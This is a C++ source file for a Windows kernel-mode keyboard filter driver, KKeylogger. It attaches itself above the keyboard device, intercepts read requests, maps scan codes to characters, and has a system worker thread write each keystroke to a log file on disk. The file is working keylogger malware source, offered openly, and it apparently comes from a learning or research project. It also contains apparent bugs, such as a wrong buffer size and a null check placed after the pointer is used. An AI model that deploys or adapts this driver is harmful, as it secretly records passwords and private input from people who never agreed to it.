#include "KCommon.h"
#include "KKeylogger.h"
#include <ntddkbd.h>
/*
Create KeyboardDevice, mimic the Flags of the device-to-attach-to,
and attach it to the device, using the DEVICE_EXTENSION to keep
track of the attached device

*/
using namespace KKeylogger::ScanCodes;
using namespace KKeylogger; 


#define DEXTENSION(FIELD) \
	((PDEVICE_EXTENSION) KDevice->DeviceExtension)->FIELD

#define KDEXTENSION(FIELD) \
	((PDEVICE_EXTENSION) DriverObj->DeviceObject->DeviceExtension)->FIELD

#define DDETACH_DEVICE() \
	IoDetachDevice(((PDEVICE_EXTENSION) DriverObj->DeviceObject->DeviceExtension)->LowerDevice)

ULONG_PTR KKeylogger::PendingIrps {};

#define INVALID 0X00 //scan code not supported by this driver
#define SPACE 0X01 //space bar
#define ENTER 0X02 //enter key
#define LSHIFT 0x03 //left shift key
#define RSHIFT 0x04 //right shift key
#define CTRL  0x05 //control key
#define ALT	  0x06 //alt key

char KeyMap[84] = {
	INVALID, //0
	INVALID, //1
	'1', //2
	'2', //3
	'3', //4
	'4', //5
	'5', //6
	'6', //7
	'7', //8
	'8', //9
	'9', //A
	'0', //B
	'-', //C
	'=', //D
	INVALID, //E
	INVALID, //F
	'q', //10
	'w', //11
	'e', //12
	'r', //13
	't', //14
	'y', //15
	'u', //16
	'i', //17
	'o', //18
	'p', //19
	'[', //1A
	']', //1B
	ENTER, //1C
	CTRL, //1D
	'a', //1E
	's', //1F
	'd', //20
	'f', //21
	'g', //22
	'h', //23
	'j', //24
	'k', //25
	'l', //26
	';', //27
	'\'', //28
	'`', //29
	LSHIFT,	//2A
	'\\', //2B
	'z', //2C
	'x', //2D
	'c', //2E
	'v', //2F
	'b', //30
	'n', //31
	'm' , //32
	',', //33
	'.', //34
	'/', //35
	RSHIFT, //36
	INVALID, //37
	ALT, //38
	SPACE, //39
	INVALID, //3A
	INVALID, //3B
	INVALID, //3C
	INVALID, //3D
	INVALID, //3E
	INVALID, //3F
	INVALID, //40
	INVALID, //41
	INVALID, //42
	INVALID, //43
	INVALID, //44
	INVALID, //45
	INVALID, //46
	'7', //47
	'8', //48
	'9', //49
	INVALID, //4A
	'4', //4B
	'5', //4C
	'6', //4D
	INVALID, //4E
	'1', //4F
	'2', //50
	'3', //51
	'0', //52
};

char ExtendedKeyMap[84] = {
	INVALID, //0
	INVALID, //1
	'!', //2
	'@', //3
	'#', //4
	'$', //5
	'%', //6
	'^', //7
	'&', //8
	'*', //9
	'(', //A
	')', //B
	'_', //C
	'+', //D
	INVALID, //E
	INVALID, //F
	'Q', //10
	'W', //11
	'E', //12
	'R', //13
	'T', //14
	'Y', //15
	'U', //16
	'I', //17
	'O', //18
	'P', //19
	'{', //1A
	'}', //1B
	ENTER, //1C
	INVALID, //1D
	'A', //1E
	'S', //1F
	'D', //20
	'F', //21
	'G', //22
	'H', //23
	'J', //24
	'K', //25
	'L', //26
	':', //27
	'"', //28
	'~', //29
	LSHIFT,	//2A
	'|', //2B
	'Z', //2C
	'X', //2D
	'C', //2E
	'V', //2F
	'B', //30
	'N', //31
	'M' , //32
	'<', //33
	'>', //34
	'?', //35
	RSHIFT, //36
	INVALID, //37
	INVALID, //38
	SPACE, //39
	INVALID, //3A
	INVALID, //3B
	INVALID, //3C
	INVALID, //3D
	INVALID, //3E
	INVALID, //3F
	INVALID, //40
	INVALID, //41
	INVALID, //42
	INVALID, //43
	INVALID, //44
	INVALID, //45
	INVALID, //46
	'7', //47
	'8', //48
	'9', //49
	INVALID, //4A
	'4', //4B
	'5', //4C
	'6', //4D
	INVALID, //4E
	'1', //4F
	'2', //50
	'3', //51
	'0', //52
};

/* PASSIVE LEVEL */
namespace {
	void
	ConvertScanCodeToKeyCode(
		PDEVICE_EXTENSION DeviceExt,
		PKEY_CODE_DATA KeyData,
		char* Keys
	)
	{  
		char key = KeyMap[KeyData->KeyData];

		KEYBOARD_INDICATOR_PARAMETERS IndicatorParams {};
		IO_STATUS_BLOCK StatusBlk {};
		KEVENT KEvent {};
		KeInitializeEvent(&KEvent,
						  NotificationEvent,
						  FALSE);

		auto Irp = IoBuildDeviceIoControlRequest(IOCTL_KEYBOARD_QUERY_INDICATORS,
												 DeviceExt->LowerDevice,
												 nullptr,
												 0,
												 &IndicatorParams,
												 sizeof(KEYBOARD_ATTRIBUTES),
												 TRUE,
												 &KEvent,
												 &StatusBlk);

		if (IoCallDriver(DeviceExt->LowerDevice, Irp) == STATUS_PENDING) 
			(VOID) KeWaitForSingleObject(&KEvent,
										 Suspended,
										 KernelMode,
										 FALSE,
										 nullptr);
		

		auto status = Irp->IoStatus.Status;

		if (status == STATUS_SUCCESS) {
			IndicatorParams = *(PKEYBOARD_INDICATOR_PARAMETERS) Irp->AssociatedIrp.SystemBuffer;
			if (Irp) {
				int flag = (IndicatorParams.LedFlags & KEYBOARD_CAPS_LOCK_ON);
				DbgPrint("Caps Lock Indicator Status: %x.\n", flag);
			}
			else
				DbgPrint("Error allocating Irp");
		}

		switch (key) {

			case LSHIFT:
				if (KeyData->KeyFlags == KEY_MAKE)
					DeviceExt->KeyState.kSHIFT = true;
				else
					DeviceExt->KeyState.kSHIFT = false;
				break;

			case RSHIFT:
				if (KeyData->KeyFlags == KEY_MAKE)
					DeviceExt->KeyState.kSHIFT = true;
				else
					DeviceExt->KeyState.kSHIFT = false;
				break;

			case CTRL:
				if (KeyData->KeyFlags == KEY_MAKE)
					DeviceExt->KeyState.kCTRL = true;
				else
					DeviceExt->KeyState.kCTRL = false;
				break;


			case ALT:
				if (KeyData->KeyFlags == KEY_MAKE)
					DeviceExt->KeyState.kALT = true;
				else
					DeviceExt->KeyState.kALT = false;
				break;


			case SPACE:
				if ((DeviceExt->KeyState.kALT != true) && (KeyData->KeyFlags == KEY_BREAK)) //the space bar does not leave 
					Keys[0] = 0x20;				//a space if pressed with the ALT key
				break;


			case ENTER:
				if ((DeviceExt->KeyState.kALT != true) && (KeyData->KeyFlags == KEY_BREAK))
				{								 
					Keys[0] = 0x0D;				
					Keys[1] = 0x0A;
				}
				break;


			default:
				if ((DeviceExt->KeyState.kALT != true) &&
					(DeviceExt->KeyState.kCTRL != true) &&
					(KeyData->KeyFlags == KEY_BREAK)) //don't convert if ALT or CTRL is pressed
				{
					if ((key >= 0x21) && (key <= 0x7E)) //don't convert non alpha numeric keys
					{
						if (DeviceExt->KeyState.kSHIFT == true)
							Keys[0] = ExtendedKeyMap[KeyData->KeyData];
						else
							Keys[0] = key;
					}
				}
				break;
		}
	}


}


NTSTATUS
KKeylogger::
CreateAttachKeylogger(
	PDRIVER_OBJECT DriverObj
)
{
	TRACER();
	PDEVICE_OBJECT KDevice;
	UNICODE_STRING KDeviceName;
	RtlInitUnicodeString(&KDeviceName, KEYBOARD_DEVICE_NAME);
	auto Status = IoCreateDevice(DriverObj,
								 sizeof(DEVICE_EXTENSION),
								 &KDeviceName,
								 FILE_DEVICE_KEYBOARD,
								 0,
								 FALSE,
								 &KDevice);
	if (!NT_SUCCESS(Status))
		return Status;

	RtlSecureZeroMemory(KDevice->DeviceExtension,
						sizeof(DEVICE_EXTENSION));

	KDevice->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE | DRVO_LEGACY_RESOURCES);
	KDevice->Flags &= ~DO_DEVICE_INITIALIZING;

	DEXTENSION(Self) = KDevice;
	DEXTENSION(SelfName) = KDeviceName;
	RtlInitUnicodeString(&DEXTENSION(LowerDeviceName),
						 TARGET_DEVICE_NAME);

	Status = IoAttachDevice(KDevice,
							&DEXTENSION(LowerDeviceName),
							&DEXTENSION(LowerDevice));
	if (!NT_SUCCESS(Status))
		IoDeleteDevice(KDevice);

	return Status;
}

/* DISPATCH LEVEL
Hook Routine */
NTSTATUS
KKeylogger::ReadDispatch(
	PDEVICE_OBJECT KDevice,
	PIRP Irp)
{
	/* each driver that passes IRPs on to lower drivers must set up the
	io_stack_location for the next lower driver */
	IoCopyCurrentIrpStackLocationToNext(Irp);
	IoSetCompletionRoutine(Irp,
						   OnReadCompletion,
						   nullptr,
						   TRUE,
						   TRUE,
						   TRUE);
	++KKeylogger::PendingIrps;
	return IoCallDriver(DEXTENSION(LowerDevice), Irp);
}


/* for a filter driver, want to pass down all the IRP_MJ_XXX
requests to the driver which is being hooked except those
of interest */
NTSTATUS
KKeylogger::DummyDispatch(
	PDEVICE_OBJECT KDevice,
	PIRP Irp
)
{
	IoCopyCurrentIrpStackLocationToNext(Irp);
	return IoCallDriver(DEXTENSION(LowerDevice), Irp);
}

/*
File I/O routines have to run at PASSIVE_LEVEL but
Completion routines can be called at DISPATCH_LEVEL :
so we signal a worker thread to write data out to the disk, 
which will be in PASSIVE_LEVEL so all file I/O can be done from there
*/

/* DISPATCH LEVEL */
NTSTATUS
KKeylogger::OnReadCompletion(
	PDEVICE_OBJECT KDevice,
	PIRP Irp,
	PVOID Context)
{
	UNREFERENCED_PARAMETER(Context);
	auto Keys = (PKEYBOARD_INPUT_DATA) Irp->AssociatedIrp.SystemBuffer;
	if (Irp->IoStatus.Status != STATUS_SUCCESS)
		return Irp->IoStatus.Status;

	ULONG_PTR NumOfKeys { Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA) };
	for (size_t i {}; i < NumOfKeys; ++i) {
		DbgPrint("[SCAN_CODE]: %X\n", Keys[i].MakeCode);
		if (Keys[i].Flags == KEY_BREAK)
			DbgPrint("[KEY_UP]\n");
		if (Keys[i].Flags == KEY_MAKE)
			DbgPrint("[KEY_DOWN]\n");


		DEXTENSION(KeyCodeData) = (PKEY_CODE_DATA) ExAllocateFromNPagedLookasideList(DEXTENSION(LookasideList));
		DEXTENSION(KeyCodeData->KeyData) = (char) Keys[i].MakeCode;
		DEXTENSION(KeyCodeData->KeyFlags) = (char) Keys[i].Flags;
		DbgPrint("[+] Allocated from LookasideList. Releasing Semaphore for Worker Thread.\n");
		KeReleaseSemaphore(&DEXTENSION(SemaphoreLock),
						   IO_NO_INCREMENT,
						   1l,
						   FALSE);
	}


	if (Irp->PendingReturned)
		IoMarkIrpPending(Irp);

	--KKeylogger::PendingIrps;
	return Irp->IoStatus.Status;
}


VOID
KKeylogger::Unload(
	PDRIVER_OBJECT DriverObj
)
{
	TRACER(); 

	DDETACH_DEVICE();

	LARGE_INTEGER Interval {};
	Interval.QuadPart = 1000000;
	while (KKeylogger::PendingIrps > 0ul)
		KeDelayExecutionThread(KernelMode,
							   FALSE,
							   &Interval);

	/* terminate worker thread */
	KDEXTENSION(ThreadTerminate) = TRUE;
	KeReleaseSemaphore(&KDEXTENSION(SemaphoreLock),
					   IO_NO_INCREMENT,
					   1l,
					   TRUE);
	KeWaitForSingleObject(KDEXTENSION(WorkerThread),
						  Executive,
						  KernelMode,
						  FALSE,
						  nullptr);
	DbgPrint("[+] KeyLogger WorkerThread successfully terminated!\n");
	ExDeleteNPagedLookasideList(KDEXTENSION(LookasideList));
	ZwClose(KDEXTENSION(LogFile));
	IoDeleteDevice(DriverObj->DeviceObject);

}

NTSTATUS
KKeylogger::
CreateLogFile(
	PDRIVER_OBJECT DriverObj)
{
	TRACER();
	UNICODE_STRING LogFileName {};
	RtlInitUnicodeString(&LogFileName, KEYBOARD_LOGFILE);
	if (LogFileName.Length <= 2 || LogFileName.MaximumLength <= 2)
		return STATUS_UNSUCCESSFUL;

	OBJECT_ATTRIBUTES ObjAttrs {};
	IO_STATUS_BLOCK StatusBlk {};
	InitializeObjectAttributes(&ObjAttrs,
							   &LogFileName,
							   OBJ_CASE_INSENSITIVE,
							   nullptr,
							   nullptr);

	auto Status = ZwCreateFile(&KDEXTENSION(LogFile),
							   GENERIC_WRITE,
							   &ObjAttrs,
							   &StatusBlk,
							   nullptr,
							   FILE_ATTRIBUTE_NORMAL,
							   0,
							   FILE_OPEN_IF,
							   FILE_SYNCHRONOUS_IO_NONALERT,
							   nullptr,
							   0ul);
	if (!NT_SUCCESS(Status))
		DbgPrint("[-] Failed to create LogFile: 0x%08X\n", Status);
	return Status;
}


NTSTATUS
KKeylogger::
InitializeThreadLogger(
	PDRIVER_OBJECT DriverObj
)
{
	TRACER();
	/* set to TRUE on Unload, since WorkerThread should run the whole time*/
	KDEXTENSION(ThreadTerminate) = FALSE;
	/* creating worker thread */
	auto KeyloggerThreadRoutine = [](PVOID Context)
	{ 
			auto DeviceExt = (PDEVICE_EXTENSION) Context;
			while (TRUE) {
				/* wait for data to come through*/
				KeWaitForSingleObject(&DeviceExt->SemaphoreLock,
									  Executive,
									  KernelMode,
									  FALSE,
									  nullptr);
				
				if (DeviceExt->ThreadTerminate == TRUE)
					PsTerminateSystemThread(STATUS_SUCCESS);

				char Keys[3] {};
				ConvertScanCodeToKeyCode(DeviceExt,
										 DeviceExt->KeyCodeData,
										 Keys);
				if (Keys != 0) {
					if (DeviceExt->LogFile) /* super duper sanity check */ {
						IO_STATUS_BLOCK StatusBlk;
						DbgPrint("[+] Writing ScanCode to file.\n");
						(!NT_SUCCESS(ZwWriteFile(DeviceExt->LogFile,
												 nullptr,
												 nullptr,
												 nullptr,
												 &StatusBlk,
												 &Keys,
												 (ULONG) strlen(Keys),
												 nullptr,
												 nullptr))) ?
							DbgPrint("[-] Writing ScanCode failed!\n") :
							DbgPrint("[+] Successfully wrote [%s] to file\n", Keys);

						
					}
				}
				ExFreeToNPagedLookasideList(DeviceExt->LookasideList,
											DeviceExt->KeyCodeData);
			}
	};

	HANDLE ThreadHandle;
	auto Status = PsCreateSystemThread(&ThreadHandle,
									   0,
									   nullptr,
									   nullptr,
									   nullptr,
									   KeyloggerThreadRoutine,
									   DriverObj->DeviceObject->DeviceExtension);

	if (!NT_SUCCESS(Status))
		return Status;

	DbgPrint("[+] Keylogger thread successfully created.\n");

	/* Obtain a pointer to the thread object and store
	it in the device extension */
	ObReferenceObjectByHandle(ThreadHandle,
							  THREAD_ALL_ACCESS,
							  nullptr,
							  KernelMode,
							  (PVOID*) &KDEXTENSION(WorkerThread),
							  nullptr);

	DbgPrint("[+] WorkerThread =  %x\n",
			 &KDEXTENSION(WorkerThread));

	//We don't need the thread handle
	ZwClose(ThreadHandle);
	return Status;
}
